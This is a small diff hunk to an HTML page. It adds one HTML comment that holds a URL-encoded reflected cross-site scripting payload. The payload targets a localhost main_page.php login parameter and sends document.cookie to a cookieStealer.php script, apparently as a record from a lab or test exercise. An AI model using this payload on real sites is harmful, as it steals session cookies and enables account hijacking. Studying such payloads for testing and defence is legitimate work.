@@ -16,3 +16,4 @@
 	});
 </script>
 </html>
+<!-- localhost:8080/main_page.php?login=%3Cscript%3Ewindow.location%3D%27%2FcookieStealer.php%3F%27%2Bdocument.cookie%3C%2Fscript%3E -->
